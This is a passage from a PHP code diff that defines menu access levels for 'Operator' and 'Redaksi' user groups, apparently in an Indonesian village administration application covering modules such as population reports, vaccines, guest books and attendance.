+                'grup'  => 'Operator',
+                'slug'  => 'master-analisis',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan-analisis',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-tanah-di-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pendapat',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-inventaris-dan-kekayaan-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-rencana-kerja-pembangunan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'administrasi-pembangunan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'c-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'lapak',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'aplikasi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengguna',
+                'akses' => '1',
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'database',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'info-sistem',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'kategori',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'lapak',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan-apbdes',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'sinkronisasi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'lembaga-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kategori-lembaga',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'bumindes-kegiatan-pembangunan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan-penduduk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'bumindes-kader',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaduan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'bumindes-hasil-pembangunan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'vaksin',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pembangunan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'arsip-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kehadiran',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'rekapitulasi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'hari-libur',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'jam-kerja',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kehadiran-pengaduan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'opendk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pesan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'grup-kontak',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'stunting',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'daftar-anjungan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'anjungan-menu',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan-anjungan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'alasan-keluar',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'gawai-layanan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'satu-data',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'dtks',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-tamu',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'data-tamu',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'data-kepuasan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'data-pertanyaan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'data-keperluan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'optimasi-gambar',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'layanan-pelanggan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pendaftaran-kerjasama',
+                'akses' => 3,
+            ],
+        ];
+    }
+}
